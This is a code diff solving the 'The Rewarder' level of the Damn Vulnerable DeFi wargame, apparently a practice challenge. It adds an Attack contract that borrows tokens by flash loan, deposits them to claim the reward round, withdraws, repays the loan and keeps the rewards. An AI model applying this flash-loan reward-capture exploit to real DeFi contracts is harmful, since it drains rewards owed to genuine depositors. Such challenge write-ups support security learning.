@@ -69,10 +69,11 @@ contract TheRewarderPoolTest is Test {
 
         assertEq(accountingToken.totalSupply(), depositAmount * users.length);
         assertEq(rewardToken.totalSupply(), 0);
-        skip(5 days);
+        vm.warp(block.timestamp + 5 days);
 
         uint256 rewardsInRound = rewarderPool.REWARDS();
         for (uint256 i = 0; i < users.length; i++) {
+            emit log_named_uint("round", rewarderPool.roundNumber());
             vm.prank(users[i]);
             rewarderPool.distributeRewards();
             assertEq(rewardToken.balanceOf(users[i]), rewardsInRound / users.length);
@@ -83,7 +84,10 @@ contract TheRewarderPoolTest is Test {
     }
 
     function exploit() public {
+        vm.warp(block.timestamp + 5 days);
         vm.startPrank(player);
+        Attack attack = new Attack(address(rewarderPool), address(liquidityToken), address(rewardToken));
+        attack.attack(address(flashLoanPool), TOKENS_IN_LENDER_POOL);
 
         vm.stopPrank();
     }
@@ -99,5 +103,44 @@ contract TheRewarderPoolTest is Test {
             uint256 delta = userRewards - (rewarderPool.REWARDS() / users.length);
             assertLt(delta, 10e16);
         }
+
+        assertGt(rewardToken.totalSupply(), rewarderPool.REWARDS());
+        uint256 playerRewards = rewardToken.balanceOf(player);
+        assertGt(playerRewards, 0);
+
+        uint256 delta = rewarderPool.REWARDS() - playerRewards;
+        assertLt(delta, 10e17);
+        // 400_000_000_000_000_000 = 4e17
+        assertEq(liquidityToken.balanceOf(player), 0);
+        assertEq(liquidityToken.balanceOf(address(flashLoanPool)), TOKENS_IN_LENDER_POOL);
+    }
+}
+
+contract Attack {
+    FlashLoanerPool pool;
+    TheRewarderPool rewarder;
+    DamnValuableToken liquidityToken;
+    RewardToken rewardToken;
+    address public owner;
+
+    constructor(address _rewarder, address _liquidityToken, address _rewardToken) {
+        rewarder = TheRewarderPool(_rewarder);
+        liquidityToken = DamnValuableToken(_liquidityToken);
+        rewardToken = RewardToken(_rewardToken);
+        owner = msg.sender;
+    }
+
+    function attack(address _pool, uint256 _amount) public {
+        pool = FlashLoanerPool(_pool);
+        pool.flashLoan(_amount);
+    }
+
+    function receiveFlashLoan(uint256 amount) external {
+        liquidityToken.approve(address(rewarder), amount);
+        rewarder.deposit(amount);
+        rewarder.distributeRewards();
+        rewarder.withdraw(amount);
+        liquidityToken.transfer(address(pool), amount);
+        rewardToken.transfer(owner, rewardToken.balanceOf(address(this)));
     }
 }
